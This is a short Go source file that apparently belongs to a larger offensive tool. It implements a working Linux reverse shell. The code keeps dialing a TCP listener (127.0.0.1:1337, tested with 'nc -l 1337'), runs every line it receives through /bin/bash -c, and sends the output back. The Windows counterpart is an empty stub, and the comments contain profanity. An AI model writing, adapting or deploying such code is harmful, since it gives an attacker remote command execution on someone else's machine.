package modules

/*
Test with nc -l 1337
*/

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"time"
)

func ReverseShellLinux() {
	/*
		Linux Reverse Shell Motherfuckers
	*/
	for {
		c, e := net.Dial("tcp", "127.0.0.1:1337")
		if e != nil {
			time.Sleep(3 * time.Second)
		} else {
			c.Close()
			break
		}
	}

	// now send out our shell
	conn, err := net.Dial("tcp", "127.0.0.1:1337")
	if err != nil {
		panic(err)
	}
	for {
		status, disconn := bufio.NewReader(conn).ReadString('\n') //why are you causing me errors you fuck
		fmt.Println(status)
		if disconn != nil {
			break
		}
		cmd := exec.Command("/bin/bash", "-c", status)
		out, _ := cmd.Output()
		conn.Write([]byte(out))
	}
}

func ReverseShellWindows() {

}
